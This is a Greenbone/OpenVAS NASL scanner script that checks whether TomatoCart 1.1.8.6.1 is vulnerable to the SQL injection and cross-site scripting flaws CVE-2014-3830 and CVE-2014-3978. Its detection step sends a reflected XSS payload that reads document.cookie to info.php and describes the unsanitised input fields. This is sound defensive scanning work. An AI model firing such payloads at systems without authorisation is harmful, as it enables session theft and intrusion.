if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804871" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2014-3830", "CVE-2014-3978" );
	script_bugtraq_id( 69110, 69072 );
	script_tag( name: "cvss_base", value: "6.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2014-10-28 14:44:09 +0530 (Tue, 28 Oct 2014)" );
	script_name( "TomatoCart SQL Injection and Cross Site Scripting Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with TomatoCart
  and is prone to sql-injection and cross-site scripting." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple errors are due to:

  - Input passed to info.php script via the 'faqs_id' GET parameter is not
  validated before returning it to users

  - the program does not properly sanitize user-supplied input to the
  'First Name' and 'Last Name' fields when creating new contacts." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a users browser session
  in the context of an affected site and inject or manipulate SQL queries in the
  back-end database, allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "TomatoCart version 1.1.8.6.1." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127785" );
	script_xref( name: "URL", value: "https://breaking.technology/advisories/CVE-2014-3830.txt" );
	script_xref( name: "URL", value: "https://breaking.technology/advisories/CVE-2014-3978.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/cart", "/TomatoCart", "/tomatocart", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: http_port );
	if(rcvRes && IsMatchRegexp( rcvRes, ">Powered by.*>TomatoCart<" )){
		url = dir + "/info.php?faqs&faqs_id=1';</script><script>alert(document.cookie);</script>";
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\);</script>", extra_check: make_list( ">TomatoCart<",
			 ">FAQs" ) )){
			report = http_report_vuln_url( port: http_port, url: url );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

